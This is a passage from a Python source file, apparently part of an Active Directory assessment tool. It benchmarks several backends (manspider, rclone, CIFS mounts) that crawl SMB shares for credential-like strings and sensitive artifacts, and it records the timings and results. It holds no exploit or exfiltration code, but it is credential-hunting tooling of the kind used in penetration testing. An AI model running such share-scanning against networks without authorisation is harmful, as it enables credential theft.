                    )
                else:
                    row.extend(["-", "-"])
            row.extend(
                [
                    str(int(result["candidate_files"])),
                    str(int(result.get("processed_files", result["candidate_files"]))),
                    f"{float(result.get('artifact_prepare_seconds', 0.0) or 0.0):.3f}",
                    f"{float(result.get('artifact_analysis_seconds', 0.0) or 0.0):.3f}",
                    str(int(result.get("artifact_hits", 0))),
                    _render_artifact_preview_cell(
                        list(result.get("artifact_preview_values", []) or [])
                    ),
                ]
            )
            table.add_row(*row)
        return table

    table.add_column("Scanned", style="white", justify="right")
    table.add_column("Prep (s)", style="green", justify="right")
    table.add_column("Scan (s)", style="green", justify="right")
    table.add_column("Files w/ Findings", style="white", justify="right")
    table.add_column("Credential Findings", style="yellow", justify="right")
    table.add_column("Credential Preview", style="white", overflow="fold")
    for result in results:
        prepare_seconds = float(result.get("text_prepare_seconds", 0.0) or 0.0) + float(
            result.get("document_prepare_seconds", 0.0) or 0.0
        )
        analysis_seconds = float(result.get("text_analysis_seconds", 0.0) or 0.0) + float(
            result.get("document_analysis_seconds", 0.0) or 0.0
        )
        row = [
            str(result["method"]),
            "ok" if result["success"] else "failed",
            f"{float(result['duration_seconds']):.3f}",
        ]
        if show_mapping_breakdown:
            mapping_seconds = float(result.get("mapping_seconds", 0.0) or 0.0)
            post_mapping_seconds = float(
                result.get("post_mapping_seconds", 0.0) or 0.0
            )
            if mapping_seconds > 0.0:
                row.extend(
                    [
                        f"{mapping_seconds:.3f}",
                        f"{post_mapping_seconds:.3f}",
                    ]
                )
            else:
                row.extend(["-", "-"])
        row.extend(
            [
                str(int(result["candidate_files"])),
                str(int(result["scanned_files"])),
                f"{prepare_seconds:.3f}",
                f"{analysis_seconds:.3f}",
                str(int(result["files_with_findings"])),
                str(int(result["credential_like_findings"])),
                _render_credential_preview_cell(
                    list(result.get("credential_preview_values", []) or [])
                ),
            ]
        )
        table.add_row(*row)
    return table


def _build_smb_sensitive_benchmark_phase_breakdown_table(
    *,
    results: list[dict[str, Any]],
) -> Table:
    """Build one detailed timing breakdown table for full production-like runs."""
    table = Table(
        title="[bold cyan]SMB Sensitive-Data Phase Timing Breakdown[/bold cyan]",
        header_style="bold magenta",
        box=rich.box.SIMPLE_HEAVY,
    )
    table.add_column("Method", style="cyan")
    table.add_column("Text Prep (s)", style="green", justify="right")
    table.add_column("Text Scan (s)", style="green", justify="right")
    table.add_column("Docs Prep (s)", style="green", justify="right")
    table.add_column("Docs Scan (s)", style="green", justify="right")
    table.add_column("Artifacts Prep (s)", style="green", justify="right")
    table.add_column("Artifacts Scan (s)", style="green", justify="right")
    for result in results:
        table.add_row(
            str(result["method"]),
            f"{float(result.get('text_prepare_seconds', 0.0) or 0.0):.3f}",
            f"{float(result.get('text_analysis_seconds', 0.0) or 0.0):.3f}",
            f"{float(result.get('document_prepare_seconds', 0.0) or 0.0):.3f}",
            f"{float(result.get('document_analysis_seconds', 0.0) or 0.0):.3f}",
            f"{float(result.get('artifact_prepare_seconds', 0.0) or 0.0):.3f}",
            f"{float(result.get('artifact_analysis_seconds', 0.0) or 0.0):.3f}",
        )
    return table


def _benchmark_result_findings_score(result: dict[str, Any]) -> int:
    """Return one comparable findings score across benchmark kinds."""
    return int(result.get("credential_like_findings", 0) or 0) + int(
        result.get("artifact_hits", 0) or 0
    )


def _persist_smb_mapping_benchmark_results(
    *,
    shell: Any,
    domain: str,
    username: str,
    shares_count: int,
    hosts_count: int,
    selected_methods: list[str],
    results: list[dict[str, Any]],
) -> None:
    """Persist SMB mapping benchmark results as run + cumulative history JSON."""
    from adscan_internal.workspaces import read_json_file, write_json_file

    workspace_cwd = shell._get_workspace_cwd()
    benchmark_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "mapping_benchmark",
    )
    runs_dir_abs = os.path.join(benchmark_root_abs, "runs")
    os.makedirs(runs_dir_abs, exist_ok=True)

    run_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    run_basename = f"{run_id}_{_slugify_token(username)}.json"
    run_file_abs = os.path.join(runs_dir_abs, run_basename)
    run_file_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "mapping_benchmark",
        "runs",
        run_basename,
    )
    history_abs = os.path.join(benchmark_root_abs, "history.json")
    history_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "mapping_benchmark",
        "history.json",
    )

    created_at = datetime.now(timezone.utc).replace(microsecond=0).isoformat()
    successful = [item for item in results if bool(item.get("success"))]
    fastest_success = (
        min(
            successful,
            key=lambda item: float(item.get("duration_seconds", 0.0)),
        )
        if successful
        else None
    )
    run_payload: dict[str, Any] = {
        "schema_version": 1,
        "run_id": run_id,
        "created_at": created_at,
        "domain": domain,
        "principal": f"{domain}\\{username}",
        "hosts_count": int(hosts_count),
        "shares_count": int(shares_count),
        "selected_methods": list(selected_methods),
        "results": list(results),
        "fastest_successful_method": (
            str(fastest_success.get("method", "")) if fastest_success else ""
        ),
        "fastest_successful_duration_seconds": (
            float(fastest_success.get("duration_seconds", 0.0))
            if fastest_success
            else None
        ),
    }
    normalized_method_results = _normalize_benchmark_method_results(results)

    history_payload: dict[str, Any] = {
        "schema_version": 1,
        "domain": domain,
        "updated_at": created_at,
        "runs": [],
    }
    if os.path.exists(history_abs):
        existing = read_json_file(history_abs)
        if isinstance(existing, dict):
            history_payload = existing
            history_payload.setdefault("schema_version", 1)
            history_payload.setdefault("domain", domain)
            history_payload.setdefault("runs", [])

    history_entry: dict[str, Any] = {
        "run_id": run_id,
        "created_at": created_at,
        "principal": f"{domain}\\{username}",
        "hosts_count": int(hosts_count),
        "shares_count": int(shares_count),
        "selected_methods": list(selected_methods),
        "results_count": len(results),
        "success_count": len(successful),
        "fastest_successful_method": (
            str(fastest_success.get("method", "")) if fastest_success else ""
        ),
        "fastest_successful_duration_seconds": (
            float(fastest_success.get("duration_seconds", 0.0))
            if fastest_success
            else None
        ),
        "run_file": run_file_rel,
        "method_results": normalized_method_results,
    }
    history_runs = history_payload.get("runs")
    if not isinstance(history_runs, list):
        history_runs = []
    history_runs.append(history_entry)
    history_payload["runs"] = history_runs[-500:]
    history_payload["updated_at"] = created_at

    try:
        write_json_file(run_file_abs, run_payload)
        write_json_file(history_abs, history_payload)
        marked_run_rel = mark_sensitive(run_file_rel, "path")
        marked_history_rel = mark_sensitive(history_rel, "path")
        print_info(
            "SMB mapping benchmark results saved to "
            f"{marked_run_rel} (history: {marked_history_rel})."
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning("SMB mapping benchmark completed, but persistence failed.")
        print_warning_debug(
            f"SMB mapping benchmark persistence error: {type(exc).__name__}: {exc}"
        )


def _persist_smb_sensitive_benchmark_results(
    *,
    shell: Any,
    domain: str,
    username: str,
    shares_count: int,
    hosts_count: int,
    selected_methods: list[str],
    benchmark_kind: str,
    benchmark_scope: str,
    benchmark_execution_mode: str,
    results: list[dict[str, Any]],
) -> None:
    """Persist deterministic SMB sensitive-data benchmark results."""
    from adscan_internal.workspaces import read_json_file, write_json_file

    workspace_cwd = shell._get_workspace_cwd()
    benchmark_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "sensitive_benchmark",
    )
    runs_dir_abs = os.path.join(benchmark_root_abs, "runs")
    os.makedirs(runs_dir_abs, exist_ok=True)

    run_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    run_basename = f"{run_id}_{_slugify_token(username)}.json"
    run_file_abs = os.path.join(runs_dir_abs, run_basename)
    run_file_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "sensitive_benchmark",
        "runs",
        run_basename,
    )
    history_abs = os.path.join(benchmark_root_abs, "history.json")
    history_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "sensitive_benchmark",
        "history.json",
    )

    created_at = datetime.now(timezone.utc).replace(microsecond=0).isoformat()
    successful = [item for item in results if bool(item.get("success"))]
    best_findings = (
        max(successful, key=_benchmark_result_findings_score)
        if successful
        else None
    )
    fastest_success = (
        min(
            successful,
            key=lambda item: float(item.get("duration_seconds", 0.0)),
        )
        if successful
        else None
    )

    run_payload: dict[str, Any] = {
        "schema_version": 1,
        "run_id": run_id,
        "created_at": created_at,
        "domain": domain,
        "principal": f"{domain}\\{username}",
        "hosts_count": int(hosts_count),
        "shares_count": int(shares_count),
        "benchmark_kind": benchmark_kind,
        "selected_methods": list(selected_methods),
        "benchmark_scope": benchmark_scope,
        "benchmark_execution_mode": benchmark_execution_mode,
        "results": list(results),
        "fastest_successful_method": (
            str(fastest_success.get("method", "")) if fastest_success else ""
        ),
        "most_findings_method": (
            str(best_findings.get("method", "")) if best_findings else ""
        ),
    }
    history_payload: dict[str, Any] = {
        "schema_version": 1,
        "domain": domain,
        "updated_at": created_at,
        "runs": [],
    }
    if os.path.exists(history_abs):
        existing = read_json_file(history_abs)
        if isinstance(existing, dict):
            history_payload = existing
            history_payload.setdefault("schema_version", 1)
            history_payload.setdefault("domain", domain)
            history_payload.setdefault("runs", [])

    history_runs = history_payload.get("runs")
    if not isinstance(history_runs, list):
        history_runs = []
    history_runs.append(
        {
            "run_id": run_id,
            "created_at": created_at,
            "principal": f"{domain}\\{username}",
            "hosts_count": int(hosts_count),
            "shares_count": int(shares_count),
            "benchmark_kind": benchmark_kind,
            "selected_methods": list(selected_methods),
            "benchmark_scope": benchmark_scope,
            "benchmark_execution_mode": benchmark_execution_mode,
            "results_count": len(results),
            "run_file": run_file_rel,
            "fastest_successful_method": (
                str(fastest_success.get("method", "")) if fastest_success else ""
            ),
            "most_findings_method": (
                str(best_findings.get("method", "")) if best_findings else ""
            ),
        }
    )
    history_payload["runs"] = history_runs[-500:]
    history_payload["updated_at"] = created_at

    try:
        write_json_file(run_file_abs, run_payload)
        write_json_file(history_abs, history_payload)
        marked_run_rel = mark_sensitive(run_file_rel, "path")
        marked_history_rel = mark_sensitive(history_rel, "path")
        print_info(
            "SMB sensitive-data benchmark results saved to "
            f"{marked_run_rel} (history: {marked_history_rel})."
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning("SMB sensitive-data benchmark completed, but persistence failed.")
        print_warning_debug(
            f"SMB sensitive-data benchmark persistence error: "
            f"{type(exc).__name__}: {exc}"
        )


def _normalize_benchmark_method_results(
    results: list[dict[str, Any]],
) -> list[dict[str, Any]]:
    """Normalize benchmark method results for stable history persistence."""
    normalized: list[dict[str, Any]] = []
    for item in results:
        method = str(item.get("method", "") or "").strip()
        if not method:
            continue
        try:
            duration = float(item.get("duration_seconds", 0.0) or 0.0)
        except Exception:
            duration = 0.0
        try:
            mapping_seconds = float(item.get("mapping_seconds", 0.0) or 0.0)
        except Exception:
            mapping_seconds = 0.0
        try:
            post_mapping_seconds = float(item.get("post_mapping_seconds", 0.0) or 0.0)
        except Exception:
            post_mapping_seconds = 0.0
        try:
            text_phase_seconds = float(item.get("text_phase_seconds", 0.0) or 0.0)
        except Exception:
            text_phase_seconds = 0.0
        try:
            document_phase_seconds = float(
                item.get("document_phase_seconds", 0.0) or 0.0
            )
        except Exception:
            document_phase_seconds = 0.0
        try:
            artifact_phase_seconds = float(
                item.get("artifact_phase_seconds", 0.0) or 0.0
            )
        except Exception:
            artifact_phase_seconds = 0.0
        try:
            text_prepare_seconds = float(item.get("text_prepare_seconds", 0.0) or 0.0)
        except Exception:
            text_prepare_seconds = 0.0
        try:
            text_analysis_seconds = float(item.get("text_analysis_seconds", 0.0) or 0.0)
        except Exception:
            text_analysis_seconds = 0.0
        try:
            document_prepare_seconds = float(
                item.get("document_prepare_seconds", 0.0) or 0.0
            )
        except Exception:
            document_prepare_seconds = 0.0
        try:
            document_analysis_seconds = float(
                item.get("document_analysis_seconds", 0.0) or 0.0
            )
        except Exception:
            document_analysis_seconds = 0.0
        try:
            artifact_prepare_seconds = float(
                item.get("artifact_prepare_seconds", 0.0) or 0.0
            )
        except Exception:
            artifact_prepare_seconds = 0.0
        try:
            artifact_analysis_seconds = float(
                item.get("artifact_analysis_seconds", 0.0) or 0.0
            )
        except Exception:
            artifact_analysis_seconds = 0.0
        normalized.append(
            {
                "method": method,
                "success": bool(item.get("success")),
                "duration_seconds": max(0.0, duration),
                "mapping_seconds": max(0.0, mapping_seconds),
                "post_mapping_seconds": max(0.0, post_mapping_seconds),
                "text_phase_seconds": max(0.0, text_phase_seconds),
                "document_phase_seconds": max(0.0, document_phase_seconds),
                "artifact_phase_seconds": max(0.0, artifact_phase_seconds),
                "text_prepare_seconds": max(0.0, text_prepare_seconds),
                "text_analysis_seconds": max(0.0, text_analysis_seconds),
                "document_prepare_seconds": max(0.0, document_prepare_seconds),
                "document_analysis_seconds": max(0.0, document_analysis_seconds),
                "artifact_prepare_seconds": max(0.0, artifact_prepare_seconds),
                "artifact_analysis_seconds": max(0.0, artifact_analysis_seconds),
            }
        )
    return normalized


def _count_grouped_credential_findings(
    findings: dict[str, list[tuple[str, float | None, str, int, str]]],
) -> tuple[int, int]:
    """Return total findings and distinct source files for grouped findings."""
    total_findings = 0
    file_paths: set[str] = set()
    for entries in findings.values():
        if not isinstance(entries, list):
            continue
        total_findings += len(entries)
        for entry in entries:
            if isinstance(entry, tuple) and len(entry) >= 5:
                file_paths.add(str(entry[4] or "").strip())
    return total_findings, len({path for path in file_paths if path})


def _build_grouped_credential_preview(
    findings: dict[str, list[tuple[str, float | None, str, int, str]]],
    *,
    limit: int = 3,
) -> list[str]:
    """Return a compact deduplicated preview of credential values."""
    seen: set[str] = set()
    preview: list[str] = []
    for entries in findings.values():
        if not isinstance(entries, list):
            continue
        for entry in entries:
            if not isinstance(entry, tuple) or not entry:
                continue
            value = str(entry[0] or "").strip()
            if not value:
                continue
            key = value.casefold()
            if key in seen:
                continue
            seen.add(key)
            preview.append(value)
            if len(preview) >= limit:
                return preview
    return preview


def _render_credential_preview_cell(values: list[str]) -> str:
    """Render benchmark credential preview for one table cell."""
    if not values:
        return "-"
    rendered = ", ".join(mark_sensitive(value, "password") for value in values[:3])
    if len(values) > 3:
        rendered = f"{rendered}, ..."
    return rendered


def _render_artifact_preview_cell(values: list[str]) -> str:
    """Render benchmark artifact preview for one table cell."""
    if not values:
        return "-"
    rendered = ", ".join(mark_sensitive(value, "path") for value in values[:3])
    if len(values) > 3:
        rendered = f"{rendered}, ..."
    return rendered


def _resolve_credsweeper_artifacts_dir(
    *,
    shell: Any,
    domain: str,
    purpose: str,
) -> str:
    """Return writable workspace directory for CredSweeper JSON artifacts."""
    workspace_cwd = shell._get_workspace_cwd()
    return domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "credsweeper",
        "artifacts",
        purpose,
    )


def _count_files_under_path_with_extensions(
    root_path: str,
    *,
    extensions: tuple[str, ...],
) -> int:
    """Count files under a local directory tree filtered by suffix."""
    suffixes = {str(extension).strip().casefold() for extension in extensions if str(extension).strip()}
    if not suffixes:
        return 0
    total = 0
    root = Path(root_path)
    for dirpath, dirnames, filenames in os.walk(root_path):
        prune_excluded_walk_dirs(dirnames)
        base_dir = Path(dirpath)
        for filename in filenames:
            file_path = base_dir / filename
            try:
                relative_path = file_path.relative_to(root).as_posix()
            except ValueError:
                continue
            if is_globally_excluded_smb_relative_path(relative_path):
                continue
            if resolve_effective_sensitive_extension(
                str(file_path),
                allowed_extensions=tuple(suffixes),
            ) in suffixes:
                total += 1
    return total

def _run_timed_benchmark_phase(
    *,
    phase_seconds_key: str,
    runner: Callable[[], dict[str, Any]],
) -> dict[str, Any]:
    """Execute one benchmark phase and annotate its elapsed seconds."""
    started = time.perf_counter()
    result = dict(runner())
    result[phase_seconds_key] = max(0.0, time.perf_counter() - started)
    return result


def _merge_credential_benchmark_results(
    phase_results: list[dict[str, Any]],
) -> dict[str, Any]:
    """Merge per-phase credential benchmark summaries into one result."""
    merged: dict[str, Any] = {
        "success": all(bool(result.get("success")) for result in phase_results),
        "candidate_files": 0,
        "scanned_files": 0,
        "files_with_findings": 0,
        "credential_like_findings": 0,
        "mapped_shares": 0,
        "credential_preview_values": [],
        "text_phase_seconds": 0.0,
        "document_phase_seconds": 0.0,
        "text_prepare_seconds": 0.0,
        "text_analysis_seconds": 0.0,
        "document_prepare_seconds": 0.0,
        "document_analysis_seconds": 0.0,
    }
    preview_values: list[str] = []
    seen_preview_values: set[str] = set()
    for result in phase_results:
        merged["candidate_files"] += int(result.get("candidate_files", 0) or 0)
        merged["scanned_files"] += int(result.get("scanned_files", 0) or 0)
        merged["files_with_findings"] += int(result.get("files_with_findings", 0) or 0)
        merged["credential_like_findings"] += int(
            result.get("credential_like_findings", 0) or 0
        )
        merged["mapped_shares"] = max(
            int(merged["mapped_shares"]),
            int(result.get("mapped_shares", 0) or 0),
        )
        merged["text_phase_seconds"] += float(result.get("text_phase_seconds", 0.0) or 0.0)
        merged["document_phase_seconds"] += float(
            result.get("document_phase_seconds", 0.0) or 0.0
        )
        merged["text_prepare_seconds"] += float(
            result.get("text_prepare_seconds", 0.0) or 0.0
        )
        merged["text_analysis_seconds"] += float(
            result.get("text_analysis_seconds", 0.0) or 0.0
        )
        merged["document_prepare_seconds"] += float(
            result.get("document_prepare_seconds", 0.0) or 0.0
        )
        merged["document_analysis_seconds"] += float(
            result.get("document_analysis_seconds", 0.0) or 0.0
        )
        for value in list(result.get("credential_preview_values", []) or []):
            normalized = str(value or "").strip()
            if not normalized:
                continue
            key = normalized.casefold()
            if key in seen_preview_values:
                continue
            seen_preview_values.add(key)
            preview_values.append(normalized)
    merged["credential_preview_values"] = preview_values[:3]
    return merged


def _merge_full_benchmark_results(
    credential_result: dict[str, Any],
    artifact_result: dict[str, Any],
) -> dict[str, Any]:
    """Merge one credential benchmark result and one artifact result."""
    credential_preview_values = list(
        credential_result.get("credential_preview_values", []) or []
    )
    artifact_preview_values = list(
        artifact_result.get("artifact_preview_values", []) or []
    )
    return {
        "success": bool(credential_result.get("success")) and bool(
            artifact_result.get("success")
        ),
        "candidate_files": int(credential_result.get("candidate_files", 0) or 0)
        + int(artifact_result.get("candidate_files", 0) or 0),
        "scanned_files": int(credential_result.get("scanned_files", 0) or 0)
        + int(artifact_result.get("processed_files", 0) or 0),
        "files_with_findings": int(
            credential_result.get("files_with_findings", 0) or 0
        ),
        "credential_like_findings": int(
            credential_result.get("credential_like_findings", 0) or 0
        ),
        "artifact_hits": int(artifact_result.get("artifact_hits", 0) or 0),
        "mapped_shares": max(
            int(credential_result.get("mapped_shares", 0) or 0),
            int(artifact_result.get("mapped_shares", 0) or 0),
        ),
        "text_phase_seconds": float(
            credential_result.get("text_phase_seconds", 0.0) or 0.0
        ),
        "document_phase_seconds": float(
            credential_result.get("document_phase_seconds", 0.0) or 0.0
        ),
        "artifact_phase_seconds": float(
            artifact_result.get("artifact_phase_seconds", 0.0) or 0.0
        ),
        "text_prepare_seconds": float(
            credential_result.get("text_prepare_seconds", 0.0) or 0.0
        ),
        "text_analysis_seconds": float(
            credential_result.get("text_analysis_seconds", 0.0) or 0.0
        ),
        "document_prepare_seconds": float(
            credential_result.get("document_prepare_seconds", 0.0) or 0.0
        ),
        "document_analysis_seconds": float(
            credential_result.get("document_analysis_seconds", 0.0) or 0.0
        ),
        "artifact_prepare_seconds": float(
            artifact_result.get("artifact_prepare_seconds", 0.0) or 0.0
        ),
        "artifact_analysis_seconds": float(
            artifact_result.get("artifact_analysis_seconds", 0.0) or 0.0
        ),
        "credential_preview_values": credential_preview_values[:3],
        "artifact_preview_values": artifact_preview_values[:3],
    }


def _run_full_production_like_backend_benchmark(
    *,
    credential_runner: Callable[[], dict[str, Any]],
    artifact_runner: Callable[[], dict[str, Any]],
) -> dict[str, Any]:
    """Execute the production-like three-phase benchmark for one backend."""
    credential_result = credential_runner()
    artifact_started = time.perf_counter()
    artifact_result = artifact_runner()
    artifact_elapsed = max(0.0, time.perf_counter() - artifact_started)
    artifact_result = dict(artifact_result)
    artifact_result["artifact_phase_seconds"] = artifact_elapsed
    artifact_result.setdefault("artifact_prepare_seconds", 0.0)
    artifact_result.setdefault("artifact_analysis_seconds", artifact_elapsed)
    return _merge_full_benchmark_results(credential_result, artifact_result)


def _generate_cifs_benchmark_mapping(
    *,
    shell: Any,
    domain: str,
    username: str,
    password: str,
    hosts: list[str],
    shares: list[str],
    share_map: dict[str, dict[str, str]] | None,
) -> tuple[str | None, dict[str, Any]]:
    """Generate a fresh CIFS mapping for mapped benchmark scenarios."""
    success = run_smb_share_tree_mapping_with_cifs(
        shell=shell,
        domain=domain,
        shares=shares,
        username=username,
        password=password,
        hosts=hosts,
        share_map=share_map,
        run_post_mapping_workflow=False,
    )
    aggregate_map_path = _resolve_cifs_aggregate_map_path(shell=shell, domain=domain)
    return aggregate_map_path, {"success": bool(success)}


def _resolve_rclone_benchmark_mapping_purpose(
    scenario: SMBSensitiveBenchmarkScenario,
) -> str:
    """Return one stable per-scenario rclone mapping purpose."""
    return (
        "rclone_"
        f"{_slugify_token(scenario.benchmark_kind)}_"
        f"{_slugify_token(scenario.read_mode)}_"
        f"{_slugify_token(scenario.mapping_mode)}"
    )


def _run_smb_sensitive_benchmark_scenario(
    *,
    shell: Any,
    domain: str,
    shares: list[str],
    hosts: list[str],
    username: str,
    password: str,
    share_map: dict[str, dict[str, str]] | None,
    scenario: SMBSensitiveBenchmarkScenario,
) -> dict[str, Any]:
    """Execute one benchmark scenario."""
    benchmark_profile = get_sensitive_benchmark_profile(scenario.benchmark_scope)
    use_mapping = scenario.mapping_mode == "mapped"
    rclone_aggregate_map_path: str | None = None
    mapping_seconds = 0.0

    def _with_mapping_timing(result: dict[str, Any]) -> dict[str, Any]:
        timed_result = dict(result)
        timed_result["mapping_seconds"] = max(0.0, mapping_seconds)
        return timed_result

    if scenario.backend == "rclone" and use_mapping:
        mapping_started = time.perf_counter()
        rclone_aggregate_map_path, mapping_result = _generate_rclone_benchmark_mapping(
            shell=shell,
            domain=domain,
            username=username,
            password=password,
            hosts=hosts,
            shares=shares,
            share_map=share_map,
            purpose=_resolve_rclone_benchmark_mapping_purpose(scenario),
        )
        mapping_seconds += max(0.0, time.perf_counter() - mapping_started)
        if not rclone_aggregate_map_path or not bool(mapping_result.get("success")):
            return _with_mapping_timing({"success": False})

    if scenario.backend == "manspider":
        if scenario.benchmark_kind == "artifacts":
            return _with_mapping_timing(_run_manspider_artifact_benchmark(
                shell=shell,
                domain=domain,
                shares=shares,
                hosts=hosts,
                username=username,
                password=password,
            ))
        if scenario.benchmark_kind == "full":
            return _with_mapping_timing(_run_full_production_like_backend_benchmark(
                credential_runner=lambda: _run_manspider_credsweeper_benchmark(
                    shell=shell,
                    domain=domain,
                    shares=shares,
                    hosts=hosts,
                    username=username,
                    password=password,
                    benchmark_profile=SMB_SENSITIVE_FILE_PROFILE_TEXT_AND_DOCUMENTS,
                    benchmark_scope=SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED,
                    benchmark_execution_mode="production_sequenced",
                ),
                artifact_runner=lambda: _run_manspider_artifact_benchmark(
                    shell=shell,
                    domain=domain,
                    shares=shares,
                    hosts=hosts,
                    username=username,
                    password=password,
                ),
            ))
        return _with_mapping_timing(_run_manspider_credsweeper_benchmark(
            shell=shell,
            domain=domain,
            shares=shares,
            hosts=hosts,
            username=username,
            password=password,
            benchmark_profile=benchmark_profile,
            benchmark_scope=scenario.benchmark_scope,
            benchmark_execution_mode=scenario.benchmark_execution_mode,
        ))

    if scenario.backend == "rclone":
        if scenario.benchmark_kind == "artifacts":
            if use_mapping:
                return _with_mapping_timing(_run_rclone_mapped_artifact_benchmark(
                    shell=shell,
                    domain=domain,
                    shares=shares,
                    hosts=hosts,
                    username=username,
                    password=password,
                    share_map=share_map,
                    aggregate_map_path=rclone_aggregate_map_path,
                ))
            return _with_mapping_timing(_run_rclone_artifact_benchmark(
                shell=shell,
                domain=domain,
                shares=shares,
                hosts=hosts,
                username=username,
                password=password,
                share_map=share_map,
            ))
        if scenario.benchmark_kind == "full":
            credential_runner: Callable[[], dict[str, Any]]
            artifact_runner: Callable[[], dict[str, Any]]
            if scenario.read_mode == "cat_library":
                credential_runner = partial(
                    _run_rclone_cat_credsweeper_library_benchmark,
                    shell=shell,
                    domain=domain,
                    shares=shares,
                    hosts=hosts,
                    username=username,
                    password=password,
                    share_map=share_map,
                    benchmark_profile=SMB_SENSITIVE_FILE_PROFILE_TEXT_AND_DOCUMENTS,
                    benchmark_scope=SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED,
                    benchmark_execution_mode="production_sequenced",
                )
            elif use_mapping:
                credential_runner = partial(
                    _run_rclone_mapped_credsweeper_benchmark,
                    shell=shell,
                    domain=domain,
                    shares=shares,
                    hosts=hosts,
                    username=username,
                    password=password,
                    share_map=share_map,
                    benchmark_profile=SMB_SENSITIVE_FILE_PROFILE_TEXT_AND_DOCUMENTS,
                    benchmark_scope=SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED,
                    benchmark_execution_mode="production_sequenced",
                    aggregate_map_path=rclone_aggregate_map_path,
                )
            else:
                credential_runner = partial(
                    _run_rclone_credsweeper_benchmark,
                    shell=shell,
                    domain=domain,
                    shares=shares,
                    hosts=hosts,
                    username=username,
                    password=password,
                    share_map=share_map,
                    benchmark_profile=SMB_SENSITIVE_FILE_PROFILE_TEXT_AND_DOCUMENTS,
                    benchmark_scope=SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED,
                    benchmark_execution_mode="production_sequenced",
                )
            if use_mapping:
                artifact_runner = partial(
                    _run_rclone_mapped_artifact_benchmark,
                    shell=shell,
                    domain=domain,
                    shares=shares,
                    hosts=hosts,
                    username=username,
                    password=password,
                    share_map=share_map,
                    aggregate_map_path=rclone_aggregate_map_path,
                )
            else:
                artifact_runner = partial(
                    _run_rclone_artifact_benchmark,
                    shell=shell,
                    domain=domain,
                    shares=shares,
                    hosts=hosts,
                    username=username,
                    password=password,
                    share_map=share_map,
                )
            return _with_mapping_timing(_run_full_production_like_backend_benchmark(
                credential_runner=credential_runner,
                artifact_runner=artifact_runner,
            ))
        if scenario.read_mode == "cat_library":
            return _with_mapping_timing(_run_rclone_cat_credsweeper_library_benchmark(
                shell=shell,
                domain=domain,
                shares=shares,
                hosts=hosts,
                username=username,
                password=password,
                share_map=share_map,
                benchmark_profile=benchmark_profile,
                benchmark_scope=scenario.benchmark_scope,
                benchmark_execution_mode=scenario.benchmark_execution_mode,
                aggregate_map_path=rclone_aggregate_map_path,
            ))
        if use_mapping:
            return _with_mapping_timing(_run_rclone_mapped_credsweeper_benchmark(
                shell=shell,
                domain=domain,
                shares=shares,
                hosts=hosts,
                username=username,
                password=password,
                share_map=share_map,
                benchmark_profile=benchmark_profile,
                benchmark_scope=scenario.benchmark_scope,
                benchmark_execution_mode=scenario.benchmark_execution_mode,
                aggregate_map_path=rclone_aggregate_map_path,
            ))
        return _with_mapping_timing(_run_rclone_credsweeper_benchmark(
            shell=shell,
            domain=domain,
            shares=shares,
            hosts=hosts,
            username=username,
            password=password,
            share_map=share_map,
            benchmark_profile=benchmark_profile,
            benchmark_scope=scenario.benchmark_scope,
            benchmark_execution_mode=scenario.benchmark_execution_mode,
        ))

    if scenario.backend == "cifs":
        aggregate_map_path: str | None = None
        if use_mapping:
            mapping_started = time.perf_counter()
            aggregate_map_path, mapping_result = _generate_cifs_benchmark_mapping(
                shell=shell,
                domain=domain,
                username=username,
                password=password,
                hosts=hosts,
                shares=shares,
                share_map=share_map,
            )
            mapping_seconds += max(0.0, time.perf_counter() - mapping_started)
            if not aggregate_map_path or not bool(mapping_result.get("success")):
                return _with_mapping_timing({"success": False})
        if scenario.benchmark_kind == "artifacts":
            if scenario.read_mode == "full_mount":
                return _with_mapping_timing(_run_cifs_full_mount_artifact_benchmark(
                    shell=shell,
                    domain=domain,
                    shares=shares,
                    hosts=hosts,
                    username=username,
                    password=password,
                    share_map=share_map,
                    aggregate_map_path=aggregate_map_path,
                ))
            return _with_mapping_timing(_run_cifs_artifact_benchmark(
                shell=shell,
                domain=domain,
                shares=shares,
                hosts=hosts,
                username=username,
                password=password,
                share_map=share_map,
                use_mapping=use_mapping,
                aggregate_map_path=aggregate_map_path,
            ))
        if scenario.benchmark_kind == "full":
            credential_runner: Callable[[], dict[str, Any]]
            artifact_runner: Callable[[], dict[str, Any]]
            if scenario.read_mode == "full_mount":
                credential_runner = partial(
                    _run_cifs_full_mount_credsweeper_benchmark,
                    shell=shell,
                    domain=domain,
                    shares=shares,
                    hosts=hosts,
                    username=username,
                    password=password,
                    share_map=share_map,
                    benchmark_profile=SMB_SENSITIVE_FILE_PROFILE_TEXT_AND_DOCUMENTS,
                    benchmark_scope=SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED,
                    benchmark_execution_mode="production_sequenced",
                )

                artifact_runner = partial(
                    _run_cifs_full_mount_artifact_benchmark,
                    shell=shell,
                    domain=domain,
                    shares=shares,
                    hosts=hosts,
                    username=username,
                    password=password,
                    share_map=share_map,
                    aggregate_map_path=aggregate_map_path if use_mapping else None,
                )
            else:
                credential_runner = partial(
                    _run_cifs_credsweeper_benchmark,
                    shell=shell,
                    domain=domain,
                    shares=shares,
                    hosts=hosts,
                    username=username,
                    password=password,
                    share_map=share_map,
                    benchmark_profile=SMB_SENSITIVE_FILE_PROFILE_TEXT_AND_DOCUMENTS,
                    benchmark_scope=SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED,
                    benchmark_execution_mode="production_sequenced",
                    use_mapping=use_mapping,
                    aggregate_map_path=aggregate_map_path,
                )

                artifact_runner = partial(
